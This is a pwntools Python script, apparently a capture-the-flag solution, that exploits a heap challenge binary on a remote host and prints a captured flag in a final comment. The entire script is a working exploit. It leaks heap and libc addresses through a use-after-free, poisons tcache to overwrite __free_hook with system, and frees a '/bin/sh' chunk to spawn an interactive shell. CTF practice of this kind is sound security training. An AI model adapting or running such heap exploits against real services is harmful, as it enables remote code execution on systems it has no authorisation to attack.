from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('47.104.143.202', 15348)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')


def add(index, size):
    io.sendlineafter('>>\n', '1')
    io.sendlineafter('I:>>\n', str(index))
    io.sendlineafter('S:>>\n', str(size))


def edit(index, content):
    io.sendlineafter('>>\n', '2')
    io.sendlineafter('I:>>\n', str(index))
    io.sendafter('V:>>\n', content)


def show(index):
    io.sendlineafter('>>\n', '3')
    io.sendlineafter('I:>>\n', str(index))


def delete(index):
    io.sendlineafter('>>\n', '4')
    io.sendlineafter('I:>>\n', str(index))


def pwn():
    add(0, 0x28)
    add(1, 0x28)
    add(2, 0x58)
    add(3, 0x58)
    add(4, 0x58)
    delete(1)
    delete(0)
    show(0)
    heap1 = u64(io.recv(6) + b'\x00\x00')
    log.success('heap1: ' + hex(heap1))
    edit(0, p64(heap1 + 0x20)[:6] + b'\n')
    add(5, 0x28)
    add(6, 0x28)
    edit(6, b'a' * 8 + p8(0xc1) + b'\n')
    delete(2)
    for _ in range(7):
        edit(6, b'a' * 8 + p64(0xc1) + b'a' * 0x10 + b'\n')
        delete(2)
    add(7, 0x58)
    show(3)
    libc_base = u64(io.recv(6) + b'\x00\x00') - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add(8, 0x58)
    delete(4)
    delete(8)
    edit(3, p64(__free_hook) + b'\n')
    add(9, 0x58)
    add(10, 0x58)
    edit(10, p64(system) + b'\n')
    edit(9, b'/bin/sh\x00\n')
    # gdb.attach(io)
    delete(9)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{c9749ef8cbfdc4fc56542daea489a71c}
